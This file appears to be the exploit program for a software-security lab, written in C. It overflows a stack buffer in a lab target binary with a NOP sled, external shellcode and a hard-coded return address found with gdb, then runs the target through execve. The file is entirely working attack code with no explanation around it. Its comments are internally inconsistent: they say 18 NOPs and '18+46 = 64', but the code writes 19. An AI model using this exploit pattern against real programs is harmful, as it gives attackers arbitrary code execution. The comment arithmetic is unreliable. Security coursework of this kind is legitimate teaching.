#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main ( int argc, char * argv[] )
{
    int i;
	char *	args[3];
	char *	env[1];
    char    buf[124];

	args[0] = TARGET;

    // Pad beginning with 18 NOP's ('\x90')
    // We use 18 because the shellcode is 46 bytes
    // 18+46 = 64 which will keep the buf byte aligned
    for (i = 0 ; i < 19; i++)
        buf[i] = '\x90';

    // Copy shellcode into buf
    for (; i < 64; i++)
        buf[i] = shellcode[i-19];

    // Return address of 'buf' is 0x2021feb0
    // (determined by checking gdb)
    for (; i < 124; i = i+4) {
        buf[i+3] = '\x20';
        buf[i+2] = '\x21';
        buf[i+1] = '\xfe';
        buf[i]   = '\xb0';
    }

    args[1] = buf;
	args[2] = NULL;
	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
